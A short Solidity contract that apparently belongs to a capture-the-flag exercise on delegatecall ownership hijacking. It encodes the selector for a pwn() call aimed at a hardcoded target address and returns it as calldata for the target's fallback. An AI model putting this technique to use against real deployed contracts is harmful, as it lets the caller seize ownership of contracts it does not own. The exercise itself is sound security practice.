// SPDX-License-Identifier: MIT
pragma solidity >=0.6.12 <0.9.0;

contract pwnDelegation {
  bytes data = abi.encodeWithSignature("pwn()");
  address taskAddress = 0x6Ab89c816bc3341AC7D2853FB6f274319Fb2B37D;

  function callTaskFallback() public view returns (bytes memory) {
    return data;
  }
}
      
